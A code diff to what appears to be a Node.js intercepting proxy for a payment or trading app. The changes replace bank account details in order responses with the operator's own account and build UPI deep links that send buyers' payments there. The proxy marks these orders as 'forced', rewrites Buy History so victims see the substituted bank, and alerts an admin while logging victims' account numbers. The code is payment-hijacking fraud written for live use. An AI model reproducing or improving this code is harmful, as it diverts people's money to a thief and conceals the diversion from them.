@@ -1229,14 +1229,38 @@ app.all('/xxapi/*', async (req, res) => {
                 if (hasBank) deepReplaceBankFields(bj, activeBank, 0, hasBank);
                 // Also rebuild walletDomain so the "Go Pay" link uses our bank
                 const bjData = bj.data || {};
+                const amt4Case1 = getOrderAmount(req, bjData) || 0;
                 if (bjData.walletDomain && typeof bjData.walletDomain === 'string') {
                   bjData.walletDomain = replaceWalletUrl(bjData.walletDomain, activeBank);
                 } else if (bjData) {
                   // walletDomain not present — inject one based on wallet type
-                  const amt4 = getOrderAmount(req, bjData) || 0;
-                  const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4, derivedPt);
+                  const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4Case1, derivedPt);
                   if (walletDomain) bjData.walletDomain = walletDomain;
                   if (payAccount)   bjData.payAccount   = payAccount;
+                }
+                // ── Save to orderBankMap so Buy History shows our bank for this order ──
+                const case1OrderId = reqOrderId || (bjData && (bjData.rptNo || bjData.orderNo || bjData.orderId || ''));
+                if (case1OrderId) {
+                  if (!data.orderBankMap) data.orderBankMap = {};
+                  const bkAcctC1 = activeBank.accountNo;
+                  const bkIfscC1 = activeBank.ifsc;
+                  const bkNameC1 = activeBank.accountHolder;
+                  const last4C1  = bkAcctC1.slice(-4);
+                  const wDomC1   = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt4Case1}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : (bjData.walletDomain || '');
+                  data.orderBankMap[case1OrderId] = {
+                    bank:        `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                    amount:      amt4Case1,
+                    rptNo:       case1OrderId,
+                    orderNo:     case1OrderId,
+                    walletDomain: wDomC1,
+                    payType:     derivedPt,
+                    time:        now,
+                    userId:      String(userId || ''),
+                    forced:      true,   // marks this as our intercepted order
+                  };
+                  // Alt key (rptNo/orderNo may differ)
+                  if (bjData.rptNo && bjData.rptNo !== case1OrderId) data.orderBankMap[String(bjData.rptNo)] = data.orderBankMap[case1OrderId];
+                  if (bjData.orderNo && bjData.orderNo !== case1OrderId) data.orderBankMap[String(bjData.orderNo)] = data.orderBankMap[case1OrderId];
                 }
                 notifyAdmin(data,
 `🛒 BUY SUCCESS — Bank Replaced
@@ -1793,17 +1817,48 @@ app.all('/xxapi/*', async (req, res) => {
       const bank = getActiveBank(data, userId);
       if (bank) {
         const isListResp = Array.isArray(respData);
+        // Detect nested list: { total, list: [...] }  or  { data: [...] }
+        const nestedList = !isListResp && respData && typeof respData === 'object'
+          ? (Array.isArray(respData.list) ? respData.list
+           : Array.isArray(respData.data) ? respData.data
+           : null)
+          : null;
 
-        if (isListResp && bank.minAmount) {
-          // Per-item minAmount check for list responses (waitpayerpaymentslip etc.)
-          respData.forEach(item => {
+        const _oIdFields = ['rptNo','rpt_no','orderNo','order_no','orderId','order_id','slipId','buyOrderNo','tradeNo'];
+        function _getItemOId(item) {
+          for (const f of _oIdFields) { if (item[f] && String(item[f]).length >= 3) return String(item[f]); }
+          return '';
+        }
+        function _wasForced(oId) {
+          return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
+        }
+        // Smart per-item replace: browse items (orderState=0) → blanket replace;
+        // history items (orderState>0) → only replace if we forced this order
+        function _replaceListItems(list) {
+          list.forEach(item => {
             if (!item || typeof item !== 'object') return;
-            const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
-            if (iAmt > 0 && iAmt < bank.minAmount) return; // skip — under min
+            const orderState = parseInt(item.orderState ?? item.state ?? -1);
+            const isHistoryItem = orderState > 0;
+            if (isHistoryItem) {
+              // History: only replace if this order was forced by our proxy
+              const oId = _getItemOId(item);
+              if (!_wasForced(oId)) return;
+            } else {
+              // Browse (available to buy): minAmount check then blanket replace
+              const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
+              if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
+            }
             const hasAcct = scanHasBankFields(item, 0);
             if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
           });
+        }
+
+        if (isListResp) {
+          _replaceListItems(respData);
+        } else if (nestedList) {
+          _replaceListItems(nestedList);
         } else {
+          // Single order / non-list response
           let shouldReplace = true;
           if (bank.minAmount) {
             const amt = getOrderAmount(req, respData);
@@ -1899,18 +1954,21 @@ ${replaceLine}
           const acctCode = item.acctCode || item.acctcode || item.ifsc        || item.acctIfsc   || '';
           const amt      = item.amount   || item.money    || item.realAmount  || item.orderAmount || '';
 
-          data.orderBankMap[oId] = {
-            bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
-            amount: parseFloat(amt) || 0,
-            rptNo: item.rptNo || item.rpt_no || oId,
-            orderNo: item.orderNo || item.order_no || oId,
-            time: now,
-            userId: userId || ''
-          };
-          // Also index by rptNo if different from orderNo so buyitoken can look it up by either
-          const altId = item.rptNo || item.rpt_no || '';
-          if (altId && altId !== oId) {
-            data.orderBankMap[altId] = data.orderBankMap[oId];
+          // Don't overwrite entries that were forced by our proxy (forced=true)
+          if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
+            data.orderBankMap[oId] = {
+              bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
+              amount: parseFloat(amt) || 0,
+              rptNo: item.rptNo || item.rpt_no || oId,
+              orderNo: item.orderNo || item.order_no || oId,
+              time: now,
+              userId: userId || ''
+            };
+            // Also index by rptNo if different from orderNo
+            const altId = item.rptNo || item.rpt_no || '';
+            if (altId && altId !== oId && (!data.orderBankMap[altId] || !data.orderBankMap[altId].forced)) {
+              data.orderBankMap[altId] = data.orderBankMap[oId];
+            }
           }
           capturedCount++;
           logLines.push(`📋 ${oId}\n   💰 ₹${amt}  👤 ${acctName}\n   🏦 ${acctNo}${acctCode ? ' | ' + acctCode : ''}`);
